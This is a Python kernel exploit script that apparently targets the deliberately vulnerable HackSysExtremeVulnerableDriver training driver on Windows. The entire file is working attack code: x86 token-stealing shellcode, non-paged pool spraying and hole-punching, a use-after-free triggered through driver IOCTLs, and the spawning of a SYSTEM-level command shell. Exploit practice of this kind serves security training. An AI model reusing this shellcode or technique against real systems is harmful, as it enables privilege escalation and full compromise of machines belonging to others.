import ctypes, sys, struct
from ctypes import *
from ctypes.wintypes import *
from subprocess import *
 
def main():
    kernel32 = windll.kernel32
    psapi = windll.Psapi
    ntdll = windll.ntdll
    spray_event1 = spray_event2 = []
    hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
 
    if not hevDevice or hevDevice == -1:
        print "*** Couldn't get Device Driver handle"
        sys.exit(-1)
 
    #Defining our shellcode, and converting the pointer to our shellcode to a sprayable \x\x\x\x format.
    shellcode = bytearray(
        "\x90\x90\x90\x90"              # NOP Sled
        "\x60"                          # pushad
        "\x64\xA1\x24\x01\x00\x00"      # mov eax, fs:[KTHREAD_OFFSET]
        "\x8B\x40\x50"                  # mov eax, [eax + EPROCESS_OFFSET]
        "\x89\xC1"                      # mov ecx, eax (Current _EPROCESS structure)
        "\x8B\x98\xF8\x00\x00\x00"      # mov ebx, [eax + TOKEN_OFFSET]
        "\xBA\x04\x00\x00\x00"          # mov edx, 4 (SYSTEM PID)
        "\x8B\x80\xB8\x00\x00\x00"      # mov eax, [eax + FLINK_OFFSET]
        "\x2D\xB8\x00\x00\x00"          # sub eax, FLINK_OFFSET
        "\x39\x90\xB4\x00\x00\x00"      # cmp [eax + PID_OFFSET], edx
        "\x75\xED"                      # jnz
        "\x8B\x90\xF8\x00\x00\x00"      # mov edx, [eax + TOKEN_OFFSET]
        "\x89\x91\xF8\x00\x00\x00"      # mov [ecx + TOKEN_OFFSET], edx
        "\x61"                          # popad
        "\xC3"                          # ret
    )
 
    ptr = kernel32.VirtualAlloc(c_int(0), c_int(len(shellcode)), c_int(0x3000), c_int(0x40))
    buff = (c_char * len(shellcode)).from_buffer(shellcode)
    kernel32.RtlMoveMemory(c_int(ptr), buff, c_int(len(shellcode)))
    ptr_adr = hex(struct.unpack('<L', struct.pack('>L', ptr))[0])[2:].zfill(8).decode('hex')
 
    print "[+] Pointer for ring0 shellcode: {0}".format(hex(ptr))
 
    #Spraying the Non-Paged Pool with IoCompletionReserve objects, having size of 0x60.
        
    print "\n[+] Spraying Non-Paged Pool with IoCompletionReserve Objects..."
 
    for i in xrange(10000):
        spray_event1.append(ntdll.NtAllocateReserveObject(byref(HANDLE(0)), 0, 1))
    print "\t[+] Sprayed 10000 objects."
 
    for i in xrange(5000):
        spray_event2.append(ntdll.NtAllocateReserveObject(byref(HANDLE(0)), 0, 1))
    print "\t[+] Sprayed 5000 objects."
 
    #Creating alternate holes, so as to avoid coalescence.
 
    print "\n[+] Creating holes in the sprayed region..."
 
    for i in xrange(0, len(spray_event2), 2):
        kernel32.CloseHandle(spray_event2[i])
 
    #Now as our pool is perfectly groomed, we'd just follow the procedure by calling suitable IOCTLs.
    #Allocate UaF Objects --> Free UaF Objects --> Allocate Fake Objects (with our shellcode pointer in 0x60 size) --> Use UaF Object. 
 
    print "\n[+] Allocating UAF Objects..."
    kernel32.DeviceIoControl(hevDevice, 0x222013, None, None, None, 0, byref(c_ulong()), None)
 
    print "\n[+] Freeing UAF Objects..."
    kernel32.DeviceIoControl(hevDevice, 0x22201B, None, None, None, 0, byref(c_ulong()), None)
 
    print "\n[+] Allocating Fake Objects..."
    fake_obj = ptr_adr + "\x41"*(0x60 - (len(ptr_adr)))
    for i in xrange(5000):
        kernel32.DeviceIoControl(hevDevice, 0x22201F, fake_obj, len(fake_obj), None, 0, byref(c_ulong()), None)
 
    print "\n[+] Triggering UAF..."
    kernel32.DeviceIoControl(hevDevice, 0x222017, None, None, None, 0, byref(c_ulong()), None)
 
    print "\n[+] nt authority\system shell incoming"
    Popen("start cmd", shell=True)
 
if __name__ == "__main__":
    main()